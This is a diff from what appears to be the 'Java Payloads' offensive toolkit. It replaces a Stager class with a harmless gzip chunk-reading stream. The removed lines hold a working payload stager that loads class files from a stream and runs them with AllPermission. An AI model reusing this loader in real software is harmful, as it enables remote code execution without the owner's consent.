@@ -1,7 +1,7 @@
 /*
  * Java Payloads.
  * 
- * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
+ * Copyright (c) 2012 Michael 'mihi' Schierl.
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -32,49 +32,49 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.handler.dynstager;
 
-import java.io.DataInputStream;
+import java.io.EOFException;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.OutputStream;
-import java.io.PrintStream;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
+import java.util.zip.GZIPInputStream;
 
-public abstract class Stager extends ClassLoader {
+public class GZIPChunkInputStream extends InputStream {
 
-	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
-		try {
-			final DataInputStream in = new DataInputStream(rawIn);
-			Class clazz;
-			int length = in.readInt();
-			do {
-				final byte[] classfile = new byte[length];
-				in.readFully(classfile);
-				clazz = define(classfile);
-				length = in.readInt();
-			} while (length > 0);
-			final Object stage = clazz.newInstance();
-			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
-		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out, true));
+	InputStream in;
+	GZIPInputStream gzis;
+
+	public GZIPChunkInputStream(InputStream in) throws IOException {
+		this.in = in;
+		gzis = new GZIPInputStream(in, 1);
+	}
+
+	public int read() throws IOException {
+		int b = gzis.read();
+		while (b == -1) {
+			if (!reopen())
+				return -1;
+			b = gzis.read();
 		}
-	}
-	
-	protected final Class define(byte[] classfile) throws IOException {
-		final Permissions permissions = new Permissions();
-		permissions.add(new AllPermission());
-		final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
-		Class clazz = defineClass(null, classfile, 0, classfile.length, pd);
-		resolveClass(clazz);
-		return clazz;
+		return b;
+	};
+
+	public int read(byte[] b, int off, int len) throws IOException {
+		int result = gzis.read(b, off, len);
+		while (result == -1) {
+			if (!reopen())
+				return -1;
+			result = gzis.read(b, off, len);
+		}
+		return result;
 	}
 
-	public abstract void bootstrap(String[] parameters, boolean needWait) throws Exception;
-	public abstract void waitReady() throws InterruptedException;
+	private boolean reopen() throws IOException {
+		try {
+			gzis = new GZIPInputStream(in, 1);
+			return true;
+		} catch (EOFException ex) {
+			return false;
+		}
+	};
 }
